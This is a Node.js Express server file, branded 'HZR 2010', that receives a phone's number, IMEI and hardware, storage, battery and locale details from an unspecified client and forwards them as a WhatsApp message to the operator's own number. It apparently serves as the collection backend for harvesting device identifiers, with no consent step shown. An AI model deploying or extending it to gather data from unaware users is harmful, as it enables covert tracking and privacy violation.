const express = require("express");
const cors = require("cors");
const path = require("path");
require("dotenv").config();

const app = express();

const PORT = process.env.PORT || 3000;

const WASENDER_TOKEN = process.env.WASENDER_TOKEN;
const MY_WHATSAPP_NUMBER = process.env.MY_WHATSAPP_NUMBER;


// ==========================================================
// CHECK ENVIRONMENT VARIABLES
// ==========================================================

if (!WASENDER_TOKEN || !MY_WHATSAPP_NUMBER) {

    console.error("=================================");
    console.error("ERROR: Missing environment variables");
    console.error("Please set:");
    console.error("WASENDER_TOKEN");
    console.error("MY_WHATSAPP_NUMBER");
    console.error("=================================");

    process.exit(1);
}


// ==========================================================
// MIDDLEWARE
// ==========================================================

app.use(cors());

app.use(
    express.json({
        limit: "20kb"
    })
);


// ==========================================================
// HOME PAGE
// index.html is NOT changed
// ==========================================================

app.get("/", (req, res) => {

    res.sendFile(
        path.join(__dirname, "index.html")
    );

});


// ==========================================================
// STATUS
// ==========================================================

app.get("/api/status", (req, res) => {

    res.json({

        success: true,

        service: "HZR 2010",

        status: "online"

    });

});


// ==========================================================
// SEND DEVICE INFORMATION
// ==========================================================

app.post("/api/send-device-info", async (req, res) => {

    console.log("");
    console.log("=================================");
    console.log("HZR 2010");
    console.log("DEVICE INFO REQUEST RECEIVED");
    console.log("=================================");


    try {

        const info = req.body || {};


        // ======================================================
        // PHONE / IMEI
        // ======================================================

        const phoneNumber =
            info.phoneNumber || "Unavailable";

        const imei =
            info.imei || "Unavailable";


        // ======================================================
        // DEVICE
        // ======================================================

        const manufacturer =
            info.manufacturer || "Unknown";

        const brand =
            info.brand || "Unknown";

        const model =
            info.model || "Unknown";

        const androidVersion =
            info.androidVersion || "Unknown";

        const sdk =
            info.sdk || "Unknown";

        const device =
            info.device || "Unknown";

        const product =
            info.product || "Unknown";

        const board =
            info.board || "Unknown";

        const hardware =
            info.hardware || "Unknown";

        const abi =
            info.abi || "Unknown";


        // ======================================================
        // HARDWARE
        // ======================================================

        const cpuCores =
            info.cpuCores !== undefined
                ? info.cpuCores
                : "Unknown";

        const totalRamMB =
            info.totalRamMB !== undefined
                ? info.totalRamMB
                : "Unknown";

        const availableRamMB =
            info.availableRamMB !== undefined
                ? info.availableRamMB
                : "Unknown";


        // ======================================================
        // BATTERY
        // ======================================================

        const battery =
            info.battery !== undefined
                ? info.battery
                : "Unknown";


        // ======================================================
        // STORAGE
        // ======================================================

        const totalStorageMB =
            info.totalStorageMB !== undefined
                ? info.totalStorageMB
                : "Unknown";

        const freeStorageMB =
            info.freeStorageMB !== undefined
                ? info.freeStorageMB
                : "Unknown";


        // ======================================================
        // LOCALE / TIMEZONE
        // ======================================================

        const locale =
            info.locale || "Unknown";

        const timezone =
            info.timezone || "Unknown";


        // ======================================================
        // TIMESTAMP
        // ======================================================

        let timestamp =
            info.timestamp || Date.now();


        let localTime =
            "Unknown";


        try {

            localTime =
                new Date(timestamp).toLocaleString(
                    "en-US",
                    {
                        timeZone: timezone !== "Unknown"
                            ? timezone
                            : "UTC"
                    }
                );

        } catch (e) {

            localTime =
                new Date(timestamp).toISOString();

        }


        // ======================================================
        // CONVERT MEMORY
        // ======================================================

        const totalRamGB =
            totalRamMB !== "Unknown"
                ? (Number(totalRamMB) / 1024).toFixed(2)
                : "Unknown";


        const availableRamGB =
            availableRamMB !== "Unknown"
                ? (Number(availableRamMB) / 1024).toFixed(2)
                : "Unknown";


        // ======================================================
        // CONVERT STORAGE
        // ======================================================

        const totalStorageGB =
            totalStorageMB !== "Unknown"
                ? (Number(totalStorageMB) / 1024).toFixed(2)
                : "Unknown";


        const freeStorageGB =
            freeStorageMB !== "Unknown"
                ? (Number(freeStorageMB) / 1024).toFixed(2)
                : "Unknown";


        // ======================================================
        // WHATSAPP MESSAGE
        // ======================================================

        const message =

`🔵 HZR 2010
━━━━━━━━━━━━━━━━

📞 PHONE
Number          : ${phoneNumber}

🔐 DEVICE ID
IMEI            : ${imei}

📱 DEVICE
Manufacturer    : ${manufacturer}
Brand           : ${brand}
Model           : ${model}
Device          : ${device}

🤖 ANDROID
Version         : ${androidVersion}
SDK             : ${sdk}

⚙️ HARDWARE
CPU Cores       : ${cpuCores}
CPU ABI         : ${abi}
Board           : ${board}
Hardware        : ${hardware}
Product         : ${product}

🧠 MEMORY
Total RAM       : ${totalRamGB} GB
Available RAM   : ${availableRamGB} GB

🔋 BATTERY
Level           : ${battery}%

💾 STORAGE
Total           : ${totalStorageGB} GB
Free            : ${freeStorageGB} GB

🌐 SYSTEM
Locale          : ${locale}
Timezone        : ${timezone}

🕒 TIME
Local Time      : ${localTime}

━━━━━━━━━━━━━━━━
© 2010–2026 HZR 2010`;



        // ======================================================
        // SERVER LOG
        // ======================================================

        console.log("Phone:", phoneNumber);
        console.log("IMEI:", imei);
        console.log(
            "Device:",
            manufacturer,
            model
        );

        console.log(
            "Android:",
            androidVersion
        );

        console.log(
            "Sending information to WhatsApp..."
        );

        console.log(
            "Recipient:",
            MY_WHATSAPP_NUMBER
        );


        // ======================================================
        // SEND TO WASENDER
        // ======================================================

        const response = await fetch(
            "https://api.wasender.dev/messages/text",
            {

                method: "POST",

                headers: {

                    "Authorization":
                        `Bearer ${WASENDER_TOKEN}`,

                    "Content-Type":
                        "application/json"

                },

                body: JSON.stringify({

                    to: MY_WHATSAPP_NUMBER,

                    body: message

                })

            }
        );


        // ======================================================
        // READ WASENDER RESPONSE
        // ======================================================

        const resultText =
            await response.text();


        console.log(
            "Wasender HTTP status:",
            response.status
        );

        console.log(
            "Wasender response:",
            resultText
        );


        // ======================================================
        // WASENDER ERROR
        // ======================================================

        if (!response.ok) {

            console.error(
                "Wasender API returned an error."
            );

            return res.status(502).json({

                success: false,

                error:
                    "WhatsApp API error"

            });

        }


        // ======================================================
        // PARSE RESPONSE
        // ======================================================

        let result = {};

        try {

            result =
                JSON.parse(resultText);

        } catch (e) {

            console.log(
                "Wasender response was not JSON."
            );

        }


        // ======================================================
        // SUCCESS
        // ======================================================

        console.log(
            "Message accepted by Wasender."
        );

        console.log(
            "================================="
        );


        res.json({

            success: true,

            message:
                "Information sent successfully",

            wasender:
                result

        });


    } catch (error) {

        console.error(
            "================================="
        );

        console.error(
            "HZR 2010 SERVER ERROR:"
        );

        console.error(error);

        console.error(
            "================================="
        );


        res.status(500).json({

            success: false,

            error:
                "Internal server error"

        });

    }

});


// ==========================================================
// START SERVER
// ==========================================================

app.listen(
    PORT,
    "0.0.0.0",
    () => {

        console.log("");
        console.log("=================================");
        console.log("HZR 2010 SERVER");
        console.log("=================================");

        console.log(
            `Server running on port ${PORT}`
        );

        console.log(
            "Service: Online"
        );

        console.log(
            "================================="
        );

    }
);
